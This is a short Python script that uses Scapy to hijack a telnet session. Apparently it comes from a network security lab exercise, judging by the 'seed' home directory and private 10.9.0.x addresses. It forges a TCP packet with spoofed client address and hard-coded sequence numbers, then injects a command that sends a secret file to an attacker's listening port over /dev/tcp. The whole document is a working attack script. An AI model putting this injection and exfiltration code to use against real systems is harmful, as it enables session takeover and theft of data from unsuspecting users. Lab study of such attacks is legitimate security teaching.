#!/bin/python3
from scapy.all import *
import sys

# Fill with values found during analysis
intSourcePort = 60578
intNextSequenceNumber = 3807779056
intAcknowledgementValue = 2168643280

# Attacker listening post
strListeningIP = "10.9.0.1"
intListeningPort = 9090

# Targeting victim/server container's telnet port
strClientIP = "10.9.0.6"
strServerIP = "10.9.0.5"
intDestinationPort =  23

# Build the IP layer of the packet
lyrIP = IP(src=strClientIP, dst=strServerIP)

# Build TCP layer of the packet
lyrTCP = TCP(sport=intSourcePort,
             dport=intDestinationPort,
             flags="A",
             seq=intNextSequenceNumber,
             ack=intAcknowledgementValue)

# Add the data we want to retrieve
strData = "\rcat /home/seed/secret.txt > /dev/tcp/{listening_ip}/{listening_port}\r" \
          .format(listening_ip=strListeningIP, listening_port=intListeningPort)

# Build the full packet and show it
pktResetPacket = lyrIP / lyrTCP / strData
pktResetPacket.show()

# Send the packet
send(pktResetPacket, verbose=0)
